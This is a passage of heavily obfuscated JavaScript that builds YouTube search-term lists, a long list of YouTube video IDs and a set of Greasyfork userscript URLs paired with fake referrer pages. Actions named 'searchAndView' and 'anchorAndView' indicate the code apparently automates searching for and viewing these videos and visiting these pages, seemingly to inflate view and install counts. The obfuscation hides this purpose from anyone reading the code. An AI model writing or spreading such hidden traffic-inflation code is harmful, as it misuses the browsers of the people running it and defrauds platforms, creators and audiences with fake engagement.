searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x119a + -0x22 * 0x124 + 0x2 * 0x1c36)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x965 * 0x1 + -0x1 * 0x2132 + 0x1 * 0x2aa1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + X(0x10) + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x2 * 0xe52 + -0x1 * -0x96 + 0x1c11);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    X(0x7) + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    Y(0xd, 'wDb@') + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    Y(0x18, 'y1*4') + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    Y(0xb, 'YCqf') + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    X(0x6) + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + X(0x1) + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + Y(0x1b, 'XdZR'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': Y(0xa, 'bnpy') + W(0x0) + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': X(0x4) + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + X(0x17) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
